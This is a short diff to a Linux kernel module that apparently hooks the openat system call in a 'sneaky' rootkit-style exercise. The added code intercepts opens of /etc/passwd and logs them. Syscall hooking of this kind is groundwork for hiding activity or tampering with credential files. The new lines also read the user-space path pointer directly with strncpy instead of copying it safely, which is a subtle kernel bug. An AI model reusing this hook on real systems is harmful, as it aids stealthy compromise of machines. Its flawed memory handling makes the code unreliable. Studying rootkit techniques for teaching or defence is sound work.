@@ -44,6 +44,13 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   // Implement the sneaky part here
+  char original_pathname[256];  
+  strncpy(original_pathname, regs->si, sizeof(original_pathname));
+  original_pathname[sizeof(original_pathname) -1] = '\0';
+
+  if(strcmp(original_pathname, "/etc/passwd") == 0){
+    printk(KERN_INFO "original path %s \n", original_pathname);
+  }
   return (*original_openat)(regs);
 }
 
